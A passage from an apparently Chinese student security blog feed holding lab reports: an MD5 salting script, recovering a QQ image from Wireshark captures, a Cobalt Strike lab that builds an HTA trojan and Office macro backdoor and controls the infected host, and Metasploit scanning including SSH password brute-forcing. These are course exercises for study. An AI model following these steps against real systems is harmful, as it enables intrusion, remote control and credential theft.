class="string">| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |</span></span><br><span class="line"><span class="string">| | _____  _____ | || |     __       | || | ____  _____  | || |  ________    | || |  ____  ____  | || |    _______   | |</span></span><br><span class="line"><span class="string">| ||_   _||_   _|| || |    /  |      | || ||_   \|_   _| | || | |_   ___ `.  | || | |_  _||_  _| | || |   /  ___  |  | |</span></span><br><span class="line"><span class="string">| |  | | /\ | |  | || |    `| |      | || |  |   \ | |   | || |   | |   `. \ | || |   \ \  / /   | || |  |  (__ \_|  | |</span></span><br><span class="line"><span class="string">| |  | |/  \| |  | || |     | |      | || |  | |\ \| |   | || |   | |    | | | || |    \ \/ /    | || |   &#x27;.___`-.   | |</span></span><br><span class="line"><span class="string">| |  |   /\   |  | || |    _| |_     | || | _| |_\   |_  | || |  _| |___.&#x27; / | || |    _|  |_    | || |  |`\____) |  | |</span></span><br><span class="line"><span class="string">| |  |__/  \__|  | || |   |_____|    | || ||_____|\____| | || | |________.&#x27;  | || |   |______|   | || |  |_______.&#x27;  | |</span></span><br><span class="line"><span class="string">| |              | || |              | || |              | || |              | || |              | || |              | |</span></span><br><span class="line"><span class="string">| &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; |</span></span><br><span class="line"><span class="string"> &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;</span></span><br><span class="line"><span class="string">W1ndys的MD5加盐程序，首次发布：https://blog.w1ndys.top/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line">input_string = <span class="built_in">input</span>(<span class="string">&quot;请输入要加密的字符串: &quot;</span>)</span><br><span class="line">hash_value, salt = md5_hash_with_salt(input_string)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;输入字符串: <span class="subst">&#123;input_string&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;盐值: <span class="subst">&#123;salt.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;加盐前MD5哈希值: <span class="subst">&#123;hashlib.md5(input_string.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;加盐后MD5哈希值: <span class="subst">&#123;hash_value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../../Documents/StudyData/QFNU/AAA%E8%AF%BE%E7%A8%8B/%E5%A4%A7%E4%BA%8C%E4%B8%8B%E5%AE%9E%E8%AE%AD/%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9/7MD5%E5%8A%A0%E7%9B%90/image-20240713161142588.png"
                      alt="image-20240713161142588"
                ></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> .----------------.  .----------------.  .-----------------.  .----------------.  .----------------.  .----------------.</span><br><span class="line">| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |</span><br><span class="line">| | _____  _____ | || |     __       | || | ____  _____  | || |  ________    | || |  ____  ____  | || |    _______   | |</span><br><span class="line">| ||_   _||_   _|| || |    /  |      | || ||_   \|_   _| | || | |_   ___ `.  | || | |_  _||_  _| | || |   /  ___  |  | |</span><br><span class="line">| |  | | /\ | |  | || |    `| |      | || |  |   \ | |   | || |   | |   `. \ | || |   \ \  / /   | || |  |  (__ \_|  | |</span><br><span class="line">| |  | |/  \| |  | || |     | |      | || |  | |\ \| |   | || |   | |    | | | || |    \ \/ /    | || |   &#x27;.___`-.   | |</span><br><span class="line">| |  |   /\   |  | || |    _| |_     | || | _| |_\   |_  | || |  _| |___.&#x27; / | || |    _|  |_    | || |  |`\____) |  | |</span><br><span class="line">| |  |__/  \__|  | || |   |_____|    | || ||_____|\____| | || | |________.&#x27;  | || |   |______|   | || |  |_______.&#x27;  | |</span><br><span class="line">| |              | || |              | || |              | || |              | || |              | || |              | |</span><br><span class="line">| &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; || &#x27;--------------&#x27; |</span><br><span class="line"> &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;  &#x27;----------------&#x27;</span><br><span class="line">W1ndys的MD5加盐程序，首次发布：https://blog.w1ndys.top/</span><br><span class="line"></span><br><span class="line">请输入要加密的字符串: W1ndys</span><br><span class="line">输入字符串: W1ndys</span><br><span class="line">盐值: 6fb286108beb8146011e4df7b779ba10</span><br><span class="line">加盐前MD5哈希值: 4e9033367c1dcbf6df3b7ce889105a1d</span><br><span class="line">加盐后MD5哈希值: 8627b18f8c5f5c018649f472ad7fa776</span><br></pre></td></tr></table></figure></div>

<h3 id="加盐前"><a href="#加盐前" class="headerlink" title="加盐前"></a>加盐前</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/7/image-20240713144436522.png"
                      alt="image-20240713144436522"
                ></p>
<h3 id="加盐后"><a href="#加盐后" class="headerlink" title="加盐后"></a>加盐后</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/7/image-20240713144450558.png"
                      alt="image-20240713144450558"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>MD5</tag>
        <tag>加盐</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训8——Wireshark抓取QQ图片</title>
    <url>/posts/16b47dd5.html</url>
    <content><![CDATA[<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><ol>
<li>我是 png 文件，搜索 8950</li>
<li>找到十六进制字符</li>
<li>继续跟进</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/8/image-20240714082228870.png"
                      alt="image-20240714082228870"
                ></p>
<h2 id="删除多余数据"><a href="#删除多余数据" class="headerlink" title="删除多余数据"></a>删除多余数据</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/8/image-20240714083056445.png"
                      alt="image-20240714083056445"
                ></p>
<h2 id="查看图片"><a href="#查看图片" class="headerlink" title="查看图片"></a>查看图片</h2><p>可以看到已经抓取成功了，由于 QQ 压缩机制导致图片丢失内容过多</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/8/image-20240714083115199.png"
                      alt="image-20240714083115199"
                ></p>
<h2 id="原因与纠错"><a href="#原因与纠错" class="headerlink" title="原因与纠错"></a>原因与纠错</h2><p>测试发现从本机向其他人发送的图片会被切割，现在从手机端发给我的电脑</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/8/image-20240714085530677.png"
                      alt="image-20240714085530677"
                ></p>
<p>再次抓包发现得到了全部的内容没有被切割。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/8/image-20240714085836724.png"
                      alt="image-20240714085836724"
                ></p>
<p>删除多余数据</p>
<p>保存查看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/8/image-20240714085857692.png"
                      alt="image-20240714085857692"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>网络安全实训</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全实训9——Office宏病毒</title>
    <url>/posts/7432ba23.html</url>
    <content><![CDATA[<h2 id="下载-CS"><a href="#下载-CS" class="headerlink" title="下载 CS"></a>下载 CS</h2><p>我这里之前网络安全协会讲座测试环境的时候装过一次汉化版，考虑到实验环境，再下个老师给的 CS</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715081157188.png"
                      alt="image-20240715081157188"
                ></p>
<h2 id="运行服务端"><a href="#运行服务端" class="headerlink" title="运行服务端"></a>运行服务端</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">给予服务端程序 teamserver 执行权限（在 linux 中复制进来的文件默认是没有执行权限的）</span><br><span class="line"><span class="built_in">chmod</span> +x teamserver</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可以查看 kali 的 IP 地址（可选）</span></span><br><span class="line">ifconfig eth0</span><br><span class="line"> </span><br><span class="line"><span class="comment"># # 运行服务端程序，192.168.0.104 是本机 IP，user   是要设置的连接密码（可改）</span></span><br><span class="line">./teamserver 192.168.0.104 user</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715081739711.png"
                      alt="image-20240715081739711"
                ></p>
<p>报错了，搜了一下，配置 java 环境变量：<a class="link"   href="https://blog.csdn.net/woaipdd/article/details/130437412#/" >java 安装常见问题之 Kali 永久配置环境变量_kali 环境变量-CSDN 博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715082550903.png"
                      alt="image-20240715082550903"
                ></p>
<p>好吧还是不行，用我之前的版本的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715084351396.png"
                      alt="image-20240715084351396"
                ></p>
<p>新建配置文件，连接 CS 服务器 </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure></div>

<p>admin</p>
<p>user</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715084531021.png"
                      alt="image-20240715084531021"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715084717182.png"
                      alt="image-20240715084717182"
                ></p>
<p>创建一个新的监听器 -&gt; 填写监听器名称（随便写，不重复就行）-&gt; 选择有效载荷&#x2F;攻击模块&#x2F;攻击方式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715085901127.png"
                      alt="image-20240715085901127"
                ></p>
<p>添加 HTTP 主机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715085926582.png"
                      alt="image-20240715085926582"
                ></p>
<p>添加要在开启监听的 HTTP 端口：<em>0-65535</em>  在这个取值范围中 1023 以下的端口已经分配给了常用的一些应用程序，建议往大的填，避免端口被占用（重复）–&gt; 最后保存即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715090035615.png"
                      alt="image-20240715090035615"
                ></p>
<h2 id="攻击目标机器"><a href="#攻击目标机器" class="headerlink" title="攻击目标机器"></a>攻击目标机器</h2><ul>
<li>HTML Application（生成 <strong>hta</strong> HTML 应用程序）</li>
</ul>
<h3 id="生成-hta-文件-（木马文件）"><a href="#生成-hta-文件-（木马文件）" class="headerlink" title="生成 hta 文件 （木马文件）"></a>生成 hta 文件 （木马文件）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715090201960.png"
                      alt="image-20240715090201960"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715090220237.png"
                      alt="image-20240715090220237"
                ></p>
<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715090304128.png"
                      alt="image-20240715090304128"
                ></p>
<p>我直接用本机测试了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715093608095.png"
                      alt="image-20240715093608095"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715093656314.png"
                      alt="image-20240715093656314"
                ></p>
<h3 id="攻击目标机器-操控目标机器"><a href="#攻击目标机器-操控目标机器" class="headerlink" title="攻击目标机器 - 操控目标机器"></a>攻击目标机器 - 操控目标机器</h3><p>当有目标主机以任何方式运行了生成的被控端，出现在主机列表。</p>
<p>选中要操作的目标主机 <strong>-&gt;</strong> 鼠标右键 <strong>-&gt;</strong> 进入 beacon（交互命令界面），在此使用 Beacon Commands 对目标主机执行各种操作。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715094102087.png"
                      alt="image-20240715094102087"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715094135319.png"
                      alt="image-20240715094135319"
                ></p>
<p>图形界面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715094210812.png"
                      alt="image-20240715094210812"
                ></p>
<p>查看 IP</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715094242078.png"
                      alt="image-20240715094242078"
                ></p>
<p>使用文件管理</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715094309859.png"
                      alt="image-20240715094309859"
                ></p>
<h4 id="获取目标的进程"><a href="#获取目标的进程" class="headerlink" title="获取目标的进程"></a>获取目标的进程</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715094407929.png"
                      alt="image-20240715094407929"
                ></p>
<h3 id="生成后门木马-Office-宏病毒"><a href="#生成后门木马-Office-宏病毒" class="headerlink" title="生成后门木马 - Office 宏病毒"></a>生成后门木马 - Office 宏病毒</h3><h5 id="创建-Office-宏病毒-代码"><a href="#创建-Office-宏病毒-代码" class="headerlink" title="创建 Office 宏病毒 代码"></a><strong>创建</strong> Office 宏病毒 代码</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715094926084.png"
                      alt="image-20240715094926084"
                ></p>
<p>成功上线</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/zuolao/9/image-20240715095102483.png"
                      alt="image-20240715095102483"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>实训</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>网络安全实训</tag>
        <tag>Office宏病毒</tag>
      </tags>
  </entry>
  <entry>
    <title>网络服务扫描实验</title>
    <url>/posts/98c41922.html</url>
    <content><![CDATA[<blockquote>
<p>老师发了个 ppt 复现一下，顺便发在博客上了</p>
</blockquote>
<h1 id="网络服务扫描实验"><a href="#网络服务扫描实验" class="headerlink" title="网络服务扫描实验"></a>网络服务扫描实验</h1><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>Metasploit 工具                        1 套</p>
<p>PC 机（win10）                        1 台</p>
<h2 id="预习要求"><a href="#预习要求" class="headerlink" title="预习要求"></a>预习要求</h2><p>做好实验预习，复习网络服务有关内容。</p>
<p>熟悉实验过程和基本操作流程。</p>
<p>做好预习报告。</p>
<h2 id="实验任务"><a href="#实验任务" class="headerlink" title="实验任务"></a>实验任务</h2><p>扫描当前机器的网络服务</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>一台安装了 Metasploit 的计算机。</p>
<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>1.Telnet 服务相关知识</p>
<p>2.SSH 服务相关知识</p>
<p>3.数据库相关知识</p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="1-Telnet-version-模块"><a href="#1-Telnet-version-模块" class="headerlink" title="1.Telnet_version 模块"></a>1.Telnet_version 模块</h3><h4 id="（1）使用-use-命令使用-telnet-version-模块。"><a href="#（1）使用-use-命令使用-telnet-version-模块。" class="headerlink" title="（1）使用 use 命令使用 telnet_version 模块。"></a>（1）使用 use 命令使用 telnet_version 模块。</h4><p> msf &gt; use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128184410056.png"
                      alt="ppp-20231128184410056"
                ></p>
<h4 id="（2）通过-show-命令查看模块的设置选项。"><a href="#（2）通过-show-命令查看模块的设置选项。" class="headerlink" title="（2）通过 show 命令查看模块的设置选项。"></a>（2）通过 show 命令查看模块的设置选项。</h4><p> msf auxiliary(telnet_version) &gt; show options</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128184439505.png"
                      alt="ppp-20231128184439505"
                ></p>
<blockquote>
<p>其中 Name 表示的是需要设置的选项的名称，Current 表示的是该选项目前默认的设置值，Setting 表示是否进行了设置，Required 则表示的是该选项是否必须设置，yes 表示必须进行设置，而 no 则表示可以设置也可以不进行设置。Description 则表示的是对选项的介绍。最重要的选项是 RHOSTS，即目标地址范围或 CIDR 标识符。也就是要扫描的地址范围设置。</p>
</blockquote>
<h4 id="（3）使用-set-命令设置目标地址范围。"><a href="#（3）使用-set-命令设置目标地址范围。" class="headerlink" title="（3）使用 set 命令设置目标地址范围。"></a>（3）使用 set 命令设置目标地址范围。</h4><p> msf auxiliary(telnet_version) &gt; set rhosts 10.10.10.0&#x2F;24</p>
<p>设置后的界面显示如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128184617822.png"
                      alt="ppp-20231128184617822"
                ></p>
<h4 id="（4）使用-set-命令设置并发线程的数量。"><a href="#（4）使用-set-命令设置并发线程的数量。" class="headerlink" title="（4）使用 set 命令设置并发线程的数量。"></a>（4）使用 set 命令设置并发线程的数量。</h4><p> msf auxiliary(telnet_version) &gt; set threads 100</p>
<p>设置后的界面显示如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128184648890.png"
                      alt="ppp-20231128184648890"
                ></p>
<h4 id="（5）使用-run-命令来执行扫描。"><a href="#（5）使用-run-命令来执行扫描。" class="headerlink" title="（5）使用 run 命令来执行扫描。"></a>（5）使用 run 命令来执行扫描。</h4><p> msf auxiliary(telnet_version) &gt; run</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128184714570.png"
                      alt="ppp-20231128184714570"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128184737533.png"
                      alt="ppp-20231128184737533"
                ></p>
<h3 id="2-SSH-version-模块"><a href="#2-SSH-version-模块" class="headerlink" title="2.SSH_version 模块"></a>2.SSH_version 模块</h3><h4 id="（1）使用-use-命令使用-ssh-version-模块。"><a href="#（1）使用-use-命令使用-ssh-version-模块。" class="headerlink" title="（1）使用 use 命令使用 ssh_version 模块。"></a>（1）使用 use 命令使用 ssh_version 模块。</h4><p> msf &gt; use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128185532984.png"
                      alt="ppp-20231128185532984"
                ></p>
<h4 id="（2）通过-show-命令查看模块的设置选项。-1"><a href="#（2）通过-show-命令查看模块的设置选项。-1" class="headerlink" title="（2）通过 show 命令查看模块的设置选项。"></a>（2）通过 show 命令查看模块的设置选项。</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128185622700.png"
                      alt="ppp-20231128185622700"
                ></p>
<blockquote>
<p>同 telnet_version 模块相同，ssh_version 扫描模块的设置选项也包括 Name、Current、Setting、Required 和 Description 五部分，所表示的含义也相同。</p>
</blockquote>
<h4 id="（3）使用-set-命令设置目标地址范围。-1"><a href="#（3）使用-set-命令设置目标地址范围。-1" class="headerlink" title="（3）使用 set 命令设置目标地址范围。"></a>（3）使用 set 命令设置目标地址范围。</h4><p> msf auxiliary(ssh_version) &gt; set rhosts 10.10.10.0&#x2F;24</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128190444297.png"
                      alt="ppp-20231128190444297"
                ></p>
<h4 id="（4）使用-set-命令设置并发线程的数量。-1"><a href="#（4）使用-set-命令设置并发线程的数量。-1" class="headerlink" title="（4）使用 set 命令设置并发线程的数量。"></a>（4）使用 set 命令设置并发线程的数量。</h4><p> msf auxiliary(ssh_version) &gt; set threads 100</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128190503895.png"
                      alt="ppp-20231128190503895"
                ></p>
<h4 id="（5）使用-run-命令来执行扫描。-1"><a href="#（5）使用-run-命令来执行扫描。-1" class="headerlink" title="（5）使用 run 命令来执行扫描。"></a>（5）使用 run 命令来执行扫描。</h4><p> msf auxiliary(ssh_version) &gt; run</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128190518744.png"
                      alt="ppp-20231128190518744"
                ></p>
<h3 id="3-SSH-login-模块"><a href="#3-SSH-login-模块" class="headerlink" title="3.SSH_login 模块"></a>3.SSH_login 模块</h3><h4 id="（1）使用-use-命令使用-ssh-login-模块。"><a href="#（1）使用-use-命令使用-ssh-login-模块。" class="headerlink" title="（1）使用 use 命令使用 ssh_login 模块。"></a>（1）使用 use 命令使用 ssh_login 模块。</h4><p> msf &gt; use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128191323632.png"
                      alt="ppp-20231128191323632"
                ></p>
<h4 id="（2）通过-show-命令查看模块的设置选项。-2"><a href="#（2）通过-show-命令查看模块的设置选项。-2" class="headerlink" title="（2）通过 show 命令查看模块的设置选项。"></a>（2）通过 show 命令查看模块的设置选项。</h4><p> msf auxiliary(ssh_login) &gt; show options</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128191341256.png"
                      alt="ppp-20231128191341256"
                ></p>
<blockquote>
<p>与前面相比，ssh_login 模块用到的设置项多了很多。下面进行简单的介绍：</p>
<p>BLANK_PASSWORDS，也就是空白密码的意思，即前面讲到的会先默认对空白密码进行验证。</p>
<p>BRUTEFORCE_SPEED，暴力破解的速度，从 0 到 5 可选。</p>
<p>PASSWORD，即准备暴力破解使用的密码，虽然不是必须的，但是没有进行暴力破解的密码，模块在验证完空密码后就停止了，因此这个其实是必须设置的。</p>
<p>PASS_FILE，即准备暴力破解使用的密码文件，PASSWORD 是指定单个的密码，而 PASS_FILE 则是将密码字典放到一个文件里，并且每行只能放置一个密码。</p>
<p>STOP_ON_SUCCESS，即如果得到主机正在工作的消息，则停止试探密码，一般是设为 false 的。</p>
<p>USERNAME，同 PASSWORD 一样，虽然要求不是必须，但是在实际使用中是需要指定的。</p>
<p>USERPASS_FILE，是同时存储了密码和用户名的口令字典文件。每行包括一个用户名和对应的一个密码，中间用一个空格分隔开。</p>
<p>USER_AS_PASS，将所用用户名作为它的密码进行猜测。这在实际使用中很有用，因为经常有些安全意识薄弱的管理员这样设置密码。</p>
<p>USER_FILE，存储试探用户名的文件，同样每行一个用户名。</p>
<p>VERBOSE，是否在窗口输出所有的尝试情况，默认是输出的。</p>
</blockquote>
<p>在口令猜测时明显需要设置的项或者说可以设置的项变的多了很多，这就需要根据实际情况来进行设置。下面，写一个简单的例子：</p>
<p>根据上次实验的结果，选取 10.10.10.254</p>
<h4 id="（3）使用-set-命令设置目标地址范围。-2"><a href="#（3）使用-set-命令设置目标地址范围。-2" class="headerlink" title="（3）使用 set 命令设置目标地址范围。"></a>（3）使用 set 命令设置目标地址范围。</h4><p> msf auxiliary(ssh_login) &gt; set rhosts 10.10.10.254</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128191448663.png"
                      alt="ppp-20231128191448663"
                ></p>
<h4 id="（4）使用-set-命令设置参数-username-的值。"><a href="#（4）使用-set-命令设置参数-username-的值。" class="headerlink" title="（4）使用 set 命令设置参数 username 的值。"></a>（4）使用 set 命令设置参数 username 的值。</h4><p>在这里仅尝试用户名为 root 的情况，因此代码如下：</p>
<p> msf auxiliary(ssh_login) &gt; set username root</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128191528700.png"
                      alt="ppp-20231128191528700"
                ></p>
<h4 id="（5）使用-set-命令设置参数-pass-file-的值。"><a href="#（5）使用-set-命令设置参数-pass-file-的值。" class="headerlink" title="（5）使用 set 命令设置参数 pass_file 的值。"></a>（5）使用 set 命令设置参数 pass_file 的值。</h4><p>将名称为 words.txt 的密码字典放在了桌面，因此代码如下：</p>
<p> msf auxiliary(ssh_login) &gt; set pass_file &#x2F;root&#x2F;Desktop&#x2F;words.txt</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128191551676.png"
                      alt="ppp-20231128191551676"
                ></p>
<h4 id="（6）使用-set-命令设置并发线程的数量。"><a href="#（6）使用-set-命令设置并发线程的数量。" class="headerlink" title="（6）使用 set 命令设置并发线程的数量。"></a>（6）使用 set 命令设置并发线程的数量。</h4><p> msf auxiliary(ssh_login) &gt; set threads 100</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128191604997.png"
                      alt="ppp-20231128191604997"
                ></p>
<h4 id="（7）使用-run-命令来执行扫描。"><a href="#（7）使用-run-命令来执行扫描。" class="headerlink" title="（7）使用 run 命令来执行扫描。"></a>（7）使用 run 命令来执行扫描。</h4><p> msf auxiliary(ssh_login) &gt; run</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192402211.png"
                      alt="ppp-20231128192402211"
                ></p>
<h3 id="4-Mssql-ping-模块"><a href="#4-Mssql-ping-模块" class="headerlink" title="4.Mssql_ping 模块"></a>4.Mssql_ping 模块</h3><h4 id="（1）使用-use-命令使用-mssql-ping-模块。"><a href="#（1）使用-use-命令使用-mssql-ping-模块。" class="headerlink" title="（1）使用 use 命令使用 mssql_ping 模块。"></a>（1）使用 use 命令使用 mssql_ping 模块。</h4><p> msf &gt; use auxiliary&#x2F;scanner&#x2F;mssql&#x2F;mssql_ping </p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192510859.png"
                      alt="ppp-20231128192510859"
                ></p>
<h4 id="（2）通过-show-命令查看模块的设置选项。-3"><a href="#（2）通过-show-命令查看模块的设置选项。-3" class="headerlink" title="（2）通过 show 命令查看模块的设置选项。"></a>（2）通过 show 命令查看模块的设置选项。</h4><p> msf auxiliary(mssql_ping) &gt; show options</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192529233.png"
                      alt="ppp-20231128192529233"
                ></p>
<blockquote>
<p>与前面不同的是在 mssql_ping 模块用到了 USERNAME 设置项，这起始与 Microsoft SQL Server 安装时候的一个默认设置有关。在初次安装服务器的时候，会默认创建 sa 或系统管理员用户。因此，这里 USERNAME 设置项的默认设置是 sa，在这里也不准备进行更改。</p>
</blockquote>
<h4 id="（3）使用-set-命令设置目标地址范围。-3"><a href="#（3）使用-set-命令设置目标地址范围。-3" class="headerlink" title="（3）使用 set 命令设置目标地址范围。"></a>（3）使用 set 命令设置目标地址范围。</h4><p> msf auxiliary(mssql_ping) &gt; set RHOSTS 202.118.176.0&#x2F;24</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192652684.png"
                      alt="ppp-20231128192652684"
                ></p>
<h4 id="（4）使用-set-命令设置并发线程的数量。-2"><a href="#（4）使用-set-命令设置并发线程的数量。-2" class="headerlink" title="（4）使用 set 命令设置并发线程的数量。"></a>（4）使用 set 命令设置并发线程的数量。</h4><p> msf auxiliary(mssql_ping) &gt; set THREADS 50</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192713890.png"
                      alt="ppp-20231128192713890"
                ></p>
<h4 id="（5）使用-run-命令来执行扫描。-2"><a href="#（5）使用-run-命令来执行扫描。-2" class="headerlink" title="（5）使用 run 命令来执行扫描。"></a>（5）使用 run 命令来执行扫描。</h4><p> msf auxiliary(mssql_ping) &gt; run</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Metasploit-review/ppp-20231128192801766.png"
                      alt="ppp-20231128192801766"
                ></p>
